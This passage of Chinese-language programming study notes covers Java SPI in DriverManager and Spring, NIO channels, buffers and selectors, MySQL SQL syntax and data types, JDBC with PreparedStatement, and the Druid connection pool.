        drivers = AccessController.doPrivileged(new PrivilegedAction<String>() {
            public String run() {
                return System.getProperty("jdbc.drivers");
            }
        });
    } catch (Exception ex) {
        drivers = null;
    }

    AccessController.doPrivileged(new PrivilegedAction<Void>() {
        public Void run() {
			//使用SPI的ServiceLoader来加载接口的实现
            ServiceLoader<Driver> loadedDrivers = ServiceLoader.load(Driver.class);
            Iterator<Driver> driversIterator = loadedDrivers.iterator();
            try{
                while(driversIterator.hasNext()) {
                    driversIterator.next();
                }
            } catch(Throwable t) {
            // Do nothing
            }
            return null;
        }
    });

    println("DriverManager.initialize: jdbc.drivers = " + drivers);

    if (drivers == null || drivers.equals("")) {
        return;
    }
    String[] driversList = drivers.split(":");
    println("number of Drivers:" + driversList.length);
    for (String aDriver : driversList) {
        try {
            println("DriverManager.Initialize: loading " + aDriver);
            Class.forName(aDriver, true,
                    ClassLoader.getSystemClassLoader());
        } catch (Exception ex) {
            println("DriverManager.Initialize: load failed: " + ex);
        }
    }
}
```

上面的代码主要步骤是：

- 从系统变量中获取有关驱动的定义。
- 使用SPI来获取驱动的实现。
- 遍历使用SPI获取到的具体实现，实例化各个实现类。
- 根据第一步获取到的驱动列表来实例化具体实现类。

我们主要关注2,3步，这两步是SPI的用法，首先看第二步，使用SPI来获取驱动的实现，对应的代码是：

```java
ServiceLoader<Driver> loadedDrivers = ServiceLoader.load(Driver.class);
```

这里没有去`META-INF/services`目录下查找配置文件，也没有加载具体实现类，做的事情就是封装了我们的接口类型和类加载器，并初始化了一个迭代器。

接着看第三步，遍历使用SPI获取到的具体实现，实例化各个实现类，对应的代码如下：

```java
//获取迭代器
Iterator<Driver> driversIterator = loadedDrivers.iterator();
//遍历所有的驱动实现
while(driversIterator.hasNext()) {
    driversIterator.next();
}
```

在遍历的时候，首先调用`driversIterator.hasNext()`方法，这里会搜索classpath下以及jar包中所有的`META-INF/services`目录下的`java.sql.Driver`文件，并找到文件中的实现类的名字，此时并没有实例化具体的实现类（ServiceLoader具体的源码实现在下面）。

然后是调用`driversIterator.next();`方法，此时就会根据驱动名字具体实例化各个实现类了。现在驱动就被找到并实例化了。

可以看下截图，我在测试项目中添加了两个jar包，`mysql-connector-java-6.0.6.jar`和`postgresql-42.0.0.0.jar`，跟踪到DriverManager中之后：

![img](./img/小米虫爬山路-img/java-advanced-spi-1.png)

可以看到此时迭代器中有两个驱动，mysql和postgresql的都被加载了。

##### 13.3.2 Spring中SPI机制

在springboot的自动装配过程中，最终会加载`META-INF/spring.factories`文件，而加载的过程是由`SpringFactoriesLoader`加载的。从CLASSPATH下的每个Jar包中搜寻所有`META-INF/spring.factories`配置文件，然后将解析properties文件，找到指定名称的配置后返回。需要注意的是，其实这里不仅仅是会去ClassPath路径下查找，会扫描所有路径下的Jar包，只不过这个文件只会在Classpath下的jar包中。

```java
public static final String FACTORIES_RESOURCE_LOCATION = "META-INF/spring.factories";
// spring.factories文件的格式为：key=value1,value2,value3
// 从所有的jar包中找到META-INF/spring.factories文件
// 然后从文件中解析出key=factoryClass类名称的所有value值
public static List<String> loadFactoryNames(Class<?> factoryClass, ClassLoader classLoader) {
    String factoryClassName = factoryClass.getName();
    // 取得资源文件的URL
    Enumeration<URL> urls = (classLoader != null ? classLoader.getResources(FACTORIES_RESOURCE_LOCATION) : ClassLoader.getSystemResources(FACTORIES_RESOURCE_LOCATION));
    List<String> result = new ArrayList<String>();
    // 遍历所有的URL
    while (urls.hasMoreElements()) {
        URL url = urls.nextElement();
        // 根据资源文件URL解析properties文件，得到对应的一组@Configuration类
        Properties properties = PropertiesLoaderUtils.loadProperties(new UrlResource(url));
        String factoryClassNames = properties.getProperty(factoryClassName);
        // 组装数据，并返回
        result.addAll(Arrays.asList(StringUtils.commaDelimitedListToStringArray(factoryClassNames)));
    }
    return result;
}
```

### 14 NIO

> 新的输入/输出 (NIO) 库是在 JDK 1.4 中引入的，弥补了原来的 I/O 的不足，提供了高速的、面向块的 I/O。@pdai

Standard IO是对**字节流**的读写，在进行IO之前，首先创建一个流对象，流对象进行读写操作都是按字节 ，一个字节一个字节的来读或写。而NIO把IO抽象成块，类似磁盘的读写，每次IO操作的单位都是一个**块**，块被读入内存之后就是一个byte[]，NIO一次可以读或写多个字节。

#### 14.1 流与块

I/O 与 NIO 最重要的区别是**数据打包**和**传输的方式**，`I/O 以流的方式处理数据，而 NIO 以块的方式处理数据`。

面向**流**的 I/O 一次处理一个字节数据: 一个输入流产生一个字节数据，一个输出流消费一个字节数据。为流式数据创建过滤器非常容易，链接几个过滤器，以便每个过滤器只负责复杂处理机制的一部分。不利的一面是，**面向流的 I/O 通常相当==慢==**。

面向**块**的 I/O 一次处理一个数据块，按块处理数据比按流处理数据要快得多。但是面向块的 I/O 缺少一些面向流的 I/O 所具有的优雅性和简单性。

I/O 包和 NIO 已经很好地集成了，java.io.* 已经以 NIO 为基础重新实现了，所以现在它可以利用 NIO 的一些特性。例如，java.io.* 包中的一些类包含以块的形式读写数据的方法，这使得即使在面向流的系统中，处理速度也会更快。

#### 14.2 通道与缓冲区

##### 14.2.1 通道

==通道 Channel 是对原 I/O 包中的流的模拟，可以通过它读取和写入数据。==

通道与流的不同之处在于，流只能在一个方向上移动(一个流必须是 InputStream 或者 OutputStream 的子类)，而通道是双向的，可以用于读、写或者同时用于读写。

通道包括以下类型:

- FileChannel: 从文件中读写数据；
- DatagramChannel: 通过 UDP 读写网络中数据；
- SocketChannel: 通过 TCP 读写网络中数据；
- ServerSocketChannel: 可以监听新进来的 TCP 连接，对每一个新进来的连接都会创建一个 SocketChannel。

##### 14.2.2 缓存区

发送给一个通道的所有数据都必须首先放到缓冲区中，同样地，从通道中读取的任何数据都要先读到缓冲区中。也就是说，不会直接对通道进行读写数据，而是要先经过缓冲区。

**缓冲区实质上是一个数组，但它不仅仅是一个数组。缓冲区提供了对数据的结构化访问，而且还可以跟踪系统的读/写进程。**

缓冲区包括以下类型:

- ByteBuffer
- CharBuffer
- ShortBuffer
- IntBuffer
- LongBuffer
- FloatBuffer
- DoubleBuffer

#### 14.3 缓冲区状态变量

- capacity: 最大容量；
- position: 当前已经读写的字节数；
- limit: 还可以读写的字节数。

状态变量的改变过程举例:

① 新建一个大小为 8 个字节的缓冲区，此时 position 为 0，而 limit = capacity = 8。capacity 变量不会改变，下面的讨论会忽略它。

![image](./img/小米虫爬山路-img/1bea398f-17a7-4f67-a90b-9e2d243eaa9a-1740154754840-13.png)

② 从输入通道中读取 5 个字节数据写入缓冲区中，此时 position 移动设置为 5，limit 保持不变。

![image](./img/小米虫爬山路-img/80804f52-8815-4096-b506-48eef3eed5c6-1740154748576-10.png)

③ 在将缓冲区的数据写到输出通道之前，需要先调用 flip() 方法，这个方法将 limit 设置为当前 position，并将 position 设置为 0。

![image](./img/小米虫爬山路-img/952e06bd-5a65-4cab-82e4-dd1536462f38-1740154740409-7.png)

④ 从缓冲区中取 4 个字节到输出缓冲中，此时 position 设为 4。

![image](./img/小米虫爬山路-img/b5bdcbe2-b958-4aef-9151-6ad963cb28b4-1740154729654-4.png)

⑤ 最后需要调用 clear() 方法来清空缓冲区，此时 position 和 limit 都被设置为最初位置。

![image](./img/小米虫爬山路-img/67bf5487-c45d-49b6-b9c0-a058d8c68902-1740154713831-1.png)

#### 14.4 文件NIO实例

以下展示了使用 NIO 快速复制文件的实例:

```java
public static void fastCopy(String src, String dist) throws IOException {

    /* 获得源文件的输入字节流 */
    FileInputStream fin = new FileInputStream(src);

    /* 获取输入字节流的文件通道 */
    FileChannel fcin = fin.getChannel();

    /* 获取目标文件的输出字节流 */
    FileOutputStream fout = new FileOutputStream(dist);

    /* 获取输出字节流的通道 */
    FileChannel fcout = fout.getChannel();

    /* 为缓冲区分配 1024 个字节 */
    ByteBuffer buffer = ByteBuffer.allocateDirect(1024);

    while (true) {

        /* 从输入通道中读取数据到缓冲区中 */
        int r = fcin.read(buffer);

        /* read() 返回 -1 表示 EOF */
        if (r == -1) {
            break;
        }

        /* 切换读写 */
        buffer.flip();

        /* 把缓冲区的内容写入输出文件中 */
        fcout.write(buffer);
        
        /* 清空缓冲区 */
        buffer.clear();
    }
}
```

#### 14.5 选择器

NIO 常常被叫做**非阻塞** IO，主要是因为 NIO 在网络通信中的非阻塞特性被广泛使用。

NIO 实现了 **IO 多路复用中的 Reactor 模型**，一个线程 Thread 使用一个选择器 Selector 通过**轮询的方式**去监听多个通道 Channel 上的事件，从而让一个线程就可以处理多个事件。

通过配置监听的通道 Channel 为非阻塞，那么当 Channel 上的 IO 事件还未到达时，就不会进入阻塞状态一直等待，而是继续轮询其它 Channel，找到 IO 事件已经到达的 Channel 执行。

**==因为创建和切换线程的开销很大，因此使用一个线程来处理多个事件而不是一个线程处理一个事件具有更好的性能。==**

应该注意的是，只有套接字 Channel 才能配置为非阻塞，而 FileChannel 不能，为 FileChannel 配置非阻塞也没有意义。

![image](./img/小米虫爬山路-img/4d930e22-f493-49ae-8dff-ea21cd6895dc.png)

##### 14.5.1 创建选择器

```java
Selector selector = Selector.open();
```

##### 14.5.2 将通道注册到选择器上

```java
ServerSocketChannel ssChannel = ServerSocketChannel.open();
ssChannel.configureBlocking(false);
ssChannel.register(selector, SelectionKey.OP_ACCEPT);
```

通道必须配置为==非阻塞模式==，否则使用选择器就没有任何意义了，因为如果通道在某个事件上被阻塞，那么服务器就不能响应其它事件，必须等待这个事件处理完毕才能去处理其它事件，显然这和选择器的作用背道而驰。

在将通道注册到选择器上时，还需要指定要注册的具体事件，主要有以下几类:

- SelectionKey.OP_CONNECT
- SelectionKey.OP_ACCEPT
- SelectionKey.OP_READ
- SelectionKey.OP_WRITE

它们在 SelectionKey 的定义如下:

```java
public static final int OP_READ = 1 << 0;
public static final int OP_WRITE = 1 << 2;
public static final int OP_CONNECT = 1 << 3;
public static final int OP_ACCEPT = 1 << 4;
```

可以看出每个事件可以被当成一个位域，从而组成事件集整数。例如:

```java
int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE;
```

##### 14.5.3 监听事件

```java
int num = selector.select();
```

使用 select() 来监听到达的事件，它会一直阻塞直到有至少一个事件到达。

##### 14.5.4 获取到达事件

```java
Set<SelectionKey> keys = selector.selectedKeys();
Iterator<SelectionKey> keyIterator = keys.iterator();
while (keyIterator.hasNext()) {
    SelectionKey key = keyIterator.next();
    if (key.isAcceptable()) {
        // ...
    } else if (key.isReadable()) {
        // ...
    }
    keyIterator.remove();
}
```

##### 14.5.5 事件循环

因为一次 select() 调用不能处理完所有的事件，并且服务器端有可能需要一直监听事件，因此服务器端处理事件的代码一般会放在一个死循环内。

```java
while (true) {
    int num = selector.select();
    Set<SelectionKey> keys = selector.selectedKeys();
    Iterator<SelectionKey> keyIterator = keys.iterator();
    while (keyIterator.hasNext()) {
        SelectionKey key = keyIterator.next();
        if (key.isAcceptable()) {
            // ...
        } else if (key.isReadable()) {
            // ...
        }
        keyIterator.remove();
    }
}
```

#### 14.6 套接字 NIO 实例

```java
public class NIOServer {

    public static void main(String[] args) throws IOException {

        Selector selector = Selector.open();

        ServerSocketChannel ssChannel = ServerSocketChannel.open();
        ssChannel.configureBlocking(false);
        ssChannel.register(selector, SelectionKey.OP_ACCEPT);

        ServerSocket serverSocket = ssChannel.socket();
        InetSocketAddress address = new InetSocketAddress("127.0.0.1", 8888);
        serverSocket.bind(address);

        while (true) {

            selector.select();
            Set<SelectionKey> keys = selector.selectedKeys();
            Iterator<SelectionKey> keyIterator = keys.iterator();

            while (keyIterator.hasNext()) {

                SelectionKey key = keyIterator.next();

                if (key.isAcceptable()) {

                    ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel();

                    // 服务器会为每个新连接创建一个 SocketChannel
                    SocketChannel sChannel = ssChannel1.accept();
                    sChannel.configureBlocking(false);

                    // 这个新连接主要用于从客户端读取数据
                    sChannel.register(selector, SelectionKey.OP_READ);

                } else if (key.isReadable()) {

                    SocketChannel sChannel = (SocketChannel) key.channel();
                    System.out.println(readDataFromSocketChannel(sChannel));
                    sChannel.close();
                }

                keyIterator.remove();
            }
        }
    }

    private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException {

        ByteBuffer buffer = ByteBuffer.allocate(1024);
        StringBuilder data = new StringBuilder();

        while (true) {

            buffer.clear();
            int n = sChannel.read(buffer);
            if (n == -1) {
                break;
            }
            buffer.flip();
            int limit = buffer.limit();
            char[] dst = new char[limit];
            for (int i = 0; i < limit; i++) {
                dst[i] = (char) buffer.get(i);
            }
            data.append(dst);
            buffer.clear();
        }
        return data.toString();
    }
}
```

```java
public class NIOClient {

    public static void main(String[] args) throws IOException {
        Socket socket = new Socket("127.0.0.1", 8888);
        OutputStream out = socket.getOutputStream();
        String s = "hello world";
        out.write(s.getBytes());
        out.close();
    }
}
```

#### 14.7 内存映射文件

内存映射文件 I/O 是一种读和写文件数据的方法，它可以比**常规的基于流或者基于通道的 I/O 快得多**。

向内存映射文件写入**可能是危险的**，只是改变数组的单个元素这样的简单操作，就可能会直接修改磁盘上的文件。**修改数据与将数据保存到磁盘是没有分开的**。

下面代码行将文件的前 1024 个字节映射到内存中，map() 方法返回一个 MappedByteBuffer，它是 ByteBuffer 的子类。因此，可以像使用其他任何 ByteBuffer 一样使用新映射的缓冲区，操作系统会在需要时负责执行映射。

```java
MappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024);
```





## 七、MySQL

### 1、数据模型

MySQL使用的是关系型数据库（RDBMS）

概念:建立在关系模型基础上，由多张相互连接的二维表组成的数据库。

特点：

1. 使用表存储数据，格式统一，便于维护
2. 使用sQL语言操作，标准统一，使用方便

存储流程图：在安装了mysql后电脑就成为了数据库模型。

![image-20230731212814512](./img/小米虫爬山路-img/image-20230731212814512.png)

一个库DBMS可以创建多个数据库，一个数据库可以创建多个表。

13、

### 2、SQL

MYSQL与SQL区别：MySQL是一个全球流行的数据库，也是一个可以处理数据库的管理系统(RDBMS)；SQL是一种数据库语言，可以定义和操作数据库。

基本语句：

==注意：所有的语句都要以分号结尾==

1. SQL语句可以单行或多行书写，以分号结尾。
2. SQL语句可以使用空格/缩进来增强语句的可读性。
3. MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。

```sql
show databases;	--查看当前所有的数据库
use 数据库名;	--打开指定的数据库
select database()  --查询当前数据库
show tables;	--查看所有的表
describe/desc 表名;	--显示表的信息
create database 数据库名;	--创建一个数据库
exit	--退出连接

--		--单行注释
#		--单行注释
/*...*/		--多行注释
```

| 分类 | 全称                       | 说明                                                   |
| ---- | -------------------------- | ------------------------------------------------------ |
| DDL  | Data Definition Language   | 数据定义语言，用来定义数据库对象(数据库，表，字段)     |
| DML  | Data Manipulation Language | 数据操作语言，用来对数据库表中的数据进行增删改         |
| DQL  | Data Query Language        | 数据查询语言，用来查询数据库中表的记录                 |
| DCL  | Data Control Language      | 数据控制语言，用来创建数据库用户、控制数据库的访问权限 |

#### 2.1 SQL数据类型

MySQL中的数据类型有很多，主要分为三类:数值类型、字符串类型、日期时间类型。

数值类型：

| 数据类型  |                             描述                             | 大小    |
| :-------: | :----------------------------------------------------------: | ------- |
|  tinyint  |                         十分小的数据                         | 1个字节 |
| smallint  |                          较小的数据                          | 2个字节 |
| mediumint |                        中等大小的数据                        | 3个字节 |
|    int    |                          标准的整数                          | 4个字节 |
|  bigint   |                          较大的数据                          | 8个字节 |
|   float   |                            浮点数                            | 4个字节 |
|  double   |                            浮点数                            | 8个字节 |
|  decimal  | 字符串形式的浮点数，依赖于M(精度:数值长度)和D(标度:小数长度)的值 |         |

字符串类型：

| 数据类型   | 描述                               | 大小         |
| ---------- | ---------------------------------- | ------------ |
| char       | 定长字符串(未占用的字符用空格占位) | 0~255        |
| varchar    | 可变字符串(根据输入变长度)         | 0~65535      |
| tinyblob   | 不超过255个字符的二进制数据        | 0~255        |
| tinytext   | 短文本字符串                       | 2^8-1        |
| blob       | 二进制形式的长文本数据             | 2^16-1       |
| text       | 长文本数据                         | 2^16-1       |
| mediumblob | 二进制形式的中等长度文本数据       | 0~16777215   |
| mediumtext | 中等长度文本数据                   | 0~16777215   |
| longblob   | 二进制形式的极大文本数据           | 0~4294967295 |
| longtext   | 大文本数据                         | 0~4294967295 |

日期类型：

| 数据类型  | 描述                           | 格式                |
| --------- | ------------------------------ | ------------------- |
| date      | 日期格式                       | YYYY-MM-DD          |
| time      | 时间格式                       | HH:mm:ss            |
| year      | 年份表示                       | YYYY                |
| datetime  | 最常用的时间格式               | YYYY-MM-DD HH:mm:ss |
| timestamp | 时间戳，1970.1.1到现在的毫秒数 | YYYY-MM-DD HH:mm:ss |

#### 2.2 DDL语句

1.创建数据库

```sql
CREATE DATABASE [ IF NOT EXISTS] 数据库名 [ DEFAULT CHARSET字符集][  COLLATE排序规则];
```

2.删除数据库

```sql
DROP DATABASE [ IF EXISTS] 数据库名;
```

3.使用数据库

```sql
--如果表名或者字段名是特殊字符，则需要带``
USE 数据库名;
```

4.查询当前数据库所有表

```sql
SHOW TABLES;
```

5.查询表结构

```sql
DESC 表名;
```

6.查询指定表的建表语句

```sql
SHOW CREATE TABLE 表名;
```

7.创建表结构

```sql
CREATE TABLE IF NOT EXISTS 表名(
	'字段名1' 列类型 [属性] [索引] [COMMENT 注释],
   	 '字段名2' 列类型 [属性] [索引] [COMMENT 注释],
    ......
    '字段名n' 列类型 [属性] [索引] [COMMENT 注释]
)[表的类型][字符集设置][COMMENT 注释]

```

注意：

- 表名和字段尽量使用``括起来

- AUTO_INCREMENT 代表自增

- 所有的语句后面加逗号，最后一个不加

- 字符串使用单引号括起来

- 主键的声明一般放在最后，便于查看

- 不设置字符集编码的话，会使用MySQL默认的字符集编码Latin1，不支持中文，可以在my.ini里修改

8.添加字段

```sql
ALTER TABLE 表名 ADD 字段名 类型(长度)[COMMENT注释];
```

9.修改数据类型

```sql
ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度);
```

10.修改字段名和字段类型

```sql
ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型(长度) [COMMENT注释];
```

11.删除字段

```sql
ALTER TABLE 表名 DROP 字段名;
```

12.删除表

```sql
DROP TABLE  [IF EXISTS]  表名
```



#### 2.3 DML语句

DML英文全称是Data Manipulation Language(数据操作语言)，用来对数据库中表的数据记录进行增删改操作。

1.添加数据

```sql
#给指定字段添加数据
INSERT INTO 表名 (字段1,字段2..) VALUES ('值1','值2'..);
#给全部字段添加数据
INSERT INTO 表名 VALUE ('值1','值2'...);
#批量添加数据
INSERT INTO 表名 (字段1,字段2..) VALUES ('值1','值2'..),('值1','值2'..),('值1','值2'..);
INSERT INTO 表名 VALUE ('值1','值2'...),('值1','值2'...),('值1','值2'...);
```

注意:

- 插入数据时，指定的字段顺序需要与值的顺序是一一对应的。
- 字符串和日期型数据应该包含在引号中。
- 插入的数据大小，应该在字段的规定范围内



2.修改数据

```sql
UPDATE 表名 SET 字段名1=值1，字段名2=值2，....[ WHERE条件];
```

3.删除数据

```sql
DELETE FROM 表名 [WHERE条件]
```

注意:

- DELETE语句的条件可以有，也可以没有，如果没有条件，则会删除整张表的所有数据。
- DELETE语句不能删除某一个字段的值(可以使用UPDATE)。



#### 2.4 DQL语句

DQL英文全称是Data Query Language(数据查询语言)，数据查询语言，用来查询数据库中表的记录。

语句：

```sql
SELECT
	字段列表
FROM
	表名列表
WHERE
	条件列表
GROUP BY
	分组字段列表
HAVING
	分组后条件列表
ORDER BY
	排序字段列表
LIMIT
	分页参数
```



1.基本查询

```sql
#查询多个字段
SELECT 字段1,字段2,字段3... FROM 表名;
SELECT * FROM 表名;

#设置别名
SELECT字段1 [AS 别名1]，字段2[AS 别名2] ...FROM表名; #增强可读性，可选项

#去除重复记录
SELECT DISTINCT 字段列表 FROM 表名;
```



2.条件查询

```sql
select 查询列表 from 表名 where 筛选条件;
```

![image-20230802185129453](./img/小米虫爬山路-img/image-20230802185129453.png)

**注意**：null值的比较不能使用= 或者 ！=，需要使用is或者is not;

> 模糊查询 使用 like 关键字，可以使用通配符进行占位 :
>
>  _: 代表单个任意字符
>
>  % : 代表任意个数字符



3.分组查询

聚合函数： 将一==列==数据作为一个整体，进行纵向计算。

| 函数  |   功能   |
| :---: | :------: |
| count | 统计数量 |
|  max  |  最大值  |
|  min  |  最小值  |
|  avg  |  平均值  |
|  sum  |   求和   |

语句：

```sql
SELECT 聚合函数 (字段列表) FROM 表名;
#null不参与计算；
```

 分组查询语法：

```sql
SELECT 字段列表 FROM 表名 [ WHERE条件] GROUP BY 分组字段名 [HAVING分组后过滤条件];
```

where与having区别

- 执行时机不同: where是分组之前进行过滤，不满足where条件，不参与分组;而having是分组之后对结果进行过滤。
- 判断条件不同: where不能对聚合函数进行判断，而having可以。

注意:

- 执行顺序: where >聚合函数>having 。
- 分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义。



4.排序查询

```sql
SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1，字段2 排序方式2;
```

排序方式

- ASC:升序
- DESC:降序

注意:如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序。



5.分页查询

```sql
SELECT 字段列表 FROM 表名 LIMIT 起始索引,查询记录数;
```

注意:

- 起始索引从o开始，起始索引=,(查 询页码-1)*每页显示记录数。
- 分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中是LIMIT。
- 如果查询的是第一页数据，起始索引可以省略，直接简写为limit 10。



**执行顺序：**

```sql
FROM
	表名列表#第一步
WHERE
	条件列表 #第二步
GROUP BY
	分组字段列表#第三步
HAVING
	分组后条件列表#第四步
SELECT
	字段列表#第五步
ORDER BY
	排序字段列表#第六步
LIMIT
	分页参数#第七步
```

#### 2.5 DCL语句

DCL英文全称是Data Control Language(数据控制语言)，用来管理数据库用户、控制数据库的访问权限。 

1.查询用户

```sql
USE mysql;
SELECT * FROM user;
```

2.创建用户

```sql
CREATE USER ‘用户名'@'主机名’  IDENTIFIED  BY‘密码’;
```

3.修改用户密码

```sql
ALTER USER ‘用户名'@'主机名’ IDENTIFIED WITH mysql_native_password BY‘新密码';
```

4.删除用户

```sql
DROP USER ‘用户名'@'主机名';
```

注意:

- 主机名可以使用%通配。
- 这类sQL开发人员操作的比较少，主要是DBA (Database Administrator 数据库管理员）使用。

MYSQL的权限修饰符

|        权限        |        说明        |
| :----------------: | :----------------: |
| ALL,ALL PRIVILEGES |      所有权限      |
|       SELECT       |      查询数据      |
|       INSERT       |      插入数据      |
|       UPDATE       |      修改数据      |
|       DELETE       |      删除数据      |
|       ALTER        |       修改表       |
|        DROP        | 删除数据库/表/视图 |
|       CREATE       |   创建数据库/表    |

5.查询权限

```sql
SHOW GRANTS FOR‘用户名'@'主机名;
```

6.授予权限

```sql
GRANT 权限列表 ON 数据库名.表名 TO ‘用户名'@'主机名‘;
```

7.撤销权限

```sql
REVOKE 权限列表 ON 数据库名.表名 TO ‘用户名'@'主机名‘;
```

注意:

- 多个权限之间，使用逗号分隔
- 授权时，数据库名和表名可以使用*进行通配，代表所有。

### 3、jdbc

JDBC:就是使用Java语言操作关系型数据库的一套API，全称:( Java DataBase Connectivity ) Java数据库连接。

JDBC本质:

- 官方(sun公司)定义的一套操作所有关系型数据库的规则，即接口
- 各个数据库厂商去实现这套接口，提供数据库驱动jar包
- 我们可以使用这套接(JDBC)编程，真正执行的代码是驱动jar包中的实现类

JDBC好处:

- 各数据库厂商使用相同的接口，Java代码不需要针对不同数据库分别开发
- 可随时替换底层数据库，访问数据库的Java代码基本不变

#### 3.1 JDBC入门

步骤图：

![image-20230801161241748](./img/小米虫爬山路-img/image-20230801161241748.png)

```java
    //注册驱动，名称固定的,其实在驱动包超过5版本后就不需要注册了，这一步可以省略
        Class.forName("com.mysql.cj.jdbc.Driver");

        //获取连接
        String url = "jdbc:mysql://localhost:3306/test";
        // jdbc:mysql:// 协议（固定写法）
        // localhost 本机ip，也可以写其他电脑的ip
        // 3306 MySQL的默认端口号
        // test是该ip的MySQL中的一个数据库名称
	//配置useSSL=false参数，禁用安全连接方式，解决警告提示
        String username = "root" ;
        String password = "123456";
        Connection conn = DriverManager.getConnection(url, username, password);
        //DriverManager（驱动管理）这个类下有一个名为getConnection（获取连接对象）的方法
        // 该方法需要三个参数（String url,String user,String password）
        // 该方法会返回一个连接对象，该连接对象是Connection接口的实现类对象

        //定义sql
        String sql = "update user set age = 99 where id = 2";
        // Statement类中有一个executeUpdate方法，专门执行DML语句（insert，delete，update）
        // 返回值是”影响数据库中的记录条数“


        //获取执行sql的对象Statement
        Statement stmt = conn.createStatement();
        // Connection类中有一个createStatement的方法可以获取到数据库操作对象
        // 数据库操作对象是Statement接口的一个实现类对象
        // 我们可以通过这个对象对数据库进行一系列的操作
        // 我们以后无论是对什么数据库进行操作，都只要调用stmt对象的方法即可，
        // 具体对Statement抽象类方法实现写在各大厂家的驱动里面

        //执行sql
        int count = stmt.executeUpdate(sql);//返回受影响的行数

        //处理结果
        System.out.println(count);

        //释放资源
        stmt.close();
        conn.close();
```

#### 3.2 API详解

##### 3.2.1 DriverManager

DriverManager(驱动管理类)作用:

- 注册驱动
- 获取数据库连接

获取连接

```java
static Connection getConnection(String url, String username, String password);
```

##### 3.2.2 Connection

Connection(数据库连接对象)作用:

- 获取执行SQL的对象
- 管理事务

1.获取执行SQL的对象

```java
Statement createStatement()
```

2.事务管理

```java
//开启事务: : true为自动提交事务;false为手动
setAutoCommit(boolean autoCommit)
//提交事务，即为开启事务提交事务
commit()
//回滚事务
rollback()
```

##### 3.2.3 Statement

Statement作用:执行SQL语句

```java
int executeUpdate(sql)//:执行DML、DDL语句
//返回值:DML语句影响的行数、DDL语句执行后，执行成功也可能返回0
ResultSet executeQuery(sql)//:执行DQL语句
//返回值:ResultSet结果集对象
```

##### 3.2.4 ResulSet

ResultSet(结果集对象)作用:封装了DQL查询语句的结果

```java
ResultSet  rs =stmt.executeQuery(sql)://执行DQL语句，返回ResultSet对象
```

boolean next():

(1)将光标从当前位置向前移动一行

(2)判断当前行是否为有效行

返回值:true有效行，当前行有数据   false无效行，当前行没有数据



xxx getXxx(参数):获取数据(一类方法)
	xxx:数据类型;如:int getlnt(参数) ; String getString(参数)

参数:

​	int:列的编号，==从1开始==

​	String:列的名称

返回值:XXX



##### 3.2.5 PreparedStatement

PreparedStatement作用:预编译SQL语句并执行,预防SQL注入问题

SQL注入:通过操作输入来修改事先定义好的SQL语句，用以达到执行代码对服务器进行攻击的方法。

**防止SQL注入****

第一步：获取PreparedStatement对象

```java
// SQL语句中的参数值,使用?占位符替代
String sql = "select * from user where username = ? and password = ?";
//通过Connection对象获取，并传入对应的sql语句,获取PreparedStatement对象
PreparedStatement pstmt = conn.prepareStatement(sql);
```

第二步：设置参数

```java
PreparedStatement对象: setXxx(参数1，参数2):给?赋值
    Xxx:数据类型;如setlnt(参数1，参数2)
    参数:
        参数1:?的位置编号，从1开始
        参数2:?的值
```

第三步：执行SQL

```java
executeUpdate(); 或 executeQuery(); //不需要再传递sql
```



**预编译**：

第一步：在创建连接对象时，传入url参数后面加入"useServerPrepStmts=true",如下：

```java
String url = "jdbc:mysql://localhost:3306/test?useServerPrepStmts=true";
```

第二步：配置mysql的my.ini文件（重启mysql后生效）

```sql
log-output=FILE
general-log=1
general_log_file="D:\Program Files\MySQL\mysql.log"
slow-query-log=1
slow_query_log_file="D:\Program Files\MySQL\mysql_slow.log"
long_query_time=2
```



#### 3.3 数据库连接池

数据库连接池简介：

- 数据库连接池是个**容器**，负责分配、管理数据库连接(Connection)
- 它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个;
- 释放空闲时间超过最大空闲时间的数据库连接来避免因为没有释放数据库连接而引起的数据库连接遗漏。
- 好处:
  - 资源重用
  - 提升系统响应速度。
  - 避免数据库连接遗漏

数据库连接池实现
	标准接口:DataSource
	官方(SUN)提供的数据库连接池标准接口，由第三方组织实现此接口。

功能:获取连接

```java
Connection getConnection()
```

> 常见的数据库连接池:
> 	DBCP
> 	C3PO
>
> Druid
>

Druid(德鲁伊)

- Druid连接池是阿里巴巴开源的数据库连接池项目
- 功能强大，性能优秀，是Java语言最好的数据库连接池之一

Driud使用步骤

1. 导入jar包druid.jar
2. 定义配置文件
3. 加载配置文件
4. 获取数据库连接池对象
5. 获取连接

```java
        //得到配置文件对象
        Properties prop = new Properties();

        //加载配置文件
        prop.load(new FileInputStream("src/druid.properties"));

        //获取连接池对象,传入配置文件对象
        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);

        //获取数据库连接 Connection
        Connection connection = dataSource.getConnection();
//上述步骤就是使用德鲁伊连接池的步骤，后面的步骤就与以前的相同了
```



配置文件如下：

```properties
#注册驱动
driverClassName=com.mysql.cj.jdbc.Driver
#useServerPrepStmts=true开启预编译
url=jdbc:mysql://localhost:3306/数据库名?useServerPrepStmts=true
username=root
password=123456
#初始连接数
initialSize=5
#最大连接数
maxActive=10
#最大等待时间
maxWait=3000
```

注意：这里键值对的名字固定不变的

### 4、函数

函数是指一段可以直接被另一段程序调用的程序或代码。



#### 4.1 字符串函数

| 函数                             | 功能                                                         |
| :------------------------------- | :----------------------------------------------------------- |
| CONCAT(s1, s2, …, sn)            | 字符串拼接，将s1, s2, …, sn拼接成一个字符串                  |
| LOWER(str)                       | 将字符串全部转为小写                                         |
| UPPER(str)                       | 将字符串全部转为大写                                         |
| LPAD(str, n, pad)                | 左填充，用字符串pad对str的左边进行填充，达到n个字符串长度    |
| RPAD(str, n, pad)                | 右填充，用字符串pad对str的右边进行填充，达到n个字符串长度    |
| TRIM(str)                        | 去掉字符串头部和尾部的空格                                   |
| SUBSTRING(str, start, len)       | 返回从字符串str从start位置起的len个长度的字符串              |
| REPLACE(column, source, replace) | 替换字符串                                                   |
